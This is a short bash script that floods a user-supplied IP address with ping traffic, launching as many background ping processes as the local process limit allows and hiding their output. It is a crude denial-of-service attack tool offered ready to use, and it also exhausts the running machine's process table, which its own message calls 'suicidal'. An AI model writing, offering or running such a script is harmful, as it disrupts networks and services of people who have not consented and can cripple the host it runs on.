#!/bin/bash

if [ -z $1 ]; then
  echo "please specify the target ip..."
  exit 1
fi

count=`ulimit -u`

echo "this is a suicidal behavior..."

for((i=0;i<count;i++))
do
  ping "$1" >/dev/null 2>&1 &
done
